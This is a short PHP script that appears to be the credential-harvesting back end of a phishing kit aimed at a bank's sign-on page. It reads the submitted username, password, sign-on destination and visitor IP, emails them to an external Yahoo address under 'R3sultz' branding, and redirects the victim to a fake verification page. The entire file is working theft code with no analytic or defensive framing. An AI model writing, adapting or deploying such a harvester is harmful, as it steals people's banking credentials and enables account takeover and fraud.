<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------SSBUSER -----------------------\n";
$message .= "USER ID : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['XXpassyXX']."\n";
$message .= "Destination : ".$_POST['ctlSignon:ddlSignonDestination']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------P0w3r3d By pedro---------------\n";

$subject="SSB USER | $ip";
$from= "From: R3sultz<@SSb>";
	 

	mail("peekay@yahoo.com





", "$subject", $message, $from);
	  
 {
   header("Location:Verification.htm");
 }

?>